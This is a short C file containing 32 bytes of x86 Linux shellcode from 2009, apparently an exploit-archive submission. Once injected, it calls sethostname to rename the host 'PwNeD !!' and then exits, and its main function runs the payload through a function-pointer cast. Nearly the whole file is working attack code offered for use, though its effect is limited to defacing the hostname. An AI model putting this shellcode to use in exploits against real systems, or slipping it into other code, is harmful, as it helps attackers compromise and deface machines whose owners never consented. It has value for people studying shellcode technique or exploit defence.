/*
Title  : sethostname "pwned !!"
Name   : 32 bytes sys_sethostname("PwNeD !!",8) x86 linux shellcode
Date   : may, 31 2009
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : linux debian
*/

#include <stdio.h>

char *shellcode=
 "\xeb\x11"                    /* jmp    0x8048073 */
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x4a"                    /* mov    $0x4a,%al */
 "\x5b"                        /* pop    %ebx */
 "\xb1\x08"                    /* mov    $0x8,%cl */
 "\xcd\x80"                    /* int    $0x80 */
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x01"                    /* mov    $0x1,%al */
 "\x31\xdb"                    /* xor    %ebx,%ebx */
 "\xcd\x80"                    /* int    $0x80 */
 "\xe8\xea\xff\xff\xff"        /* call   0x8048062 */
 "\x50"                        /* push   %eax */
 "\x77\x4e"                    /* ja     0x80480c9 */
 "\x65"                        /* gs */
 "\x44"                        /* inc    %esp */
 "\x20\x21"                    /* and    %ah,(%ecx) */
 "\x21";                        /* .byte 0x21 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}